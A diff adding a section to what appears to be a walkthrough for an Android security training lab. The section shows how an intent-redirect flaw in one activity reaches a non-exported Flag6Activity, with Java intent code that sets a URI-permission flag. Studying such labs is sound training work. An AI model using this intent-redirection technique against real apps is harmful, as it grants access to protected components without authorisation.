@@ -131,9 +131,28 @@ public void onClick(View view) {
 }
 ```
 
-#### 6 - 
+#### 6 - Not exported
 
+in the android manifest we see this activity with `android:exported="false"`
+on seeing the intent redirect vulnerability in flag5activity we can exploit that to redirect the `startactivity` call to `flag6activity` .
 
+the flag6activity looks like this - 
+```java
+super.onCreate(bundle);
+    this.f = new LogHelper(this);
+    if ((getIntent().getFlags() & 1) != 0) {
+    this.f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
+    success(this);
+}
+```
+we're gonna have to use `setFlags()` while writing our intent 
+
+```java
+nextIntent.putExtra("reason", "next");  
+nextIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);  
+nextIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");
+```
+Do exactly the same as in the flag5 to get to the `startactivity()` call, then add the above code to the respective intent.
 
 #### 7 - 
 
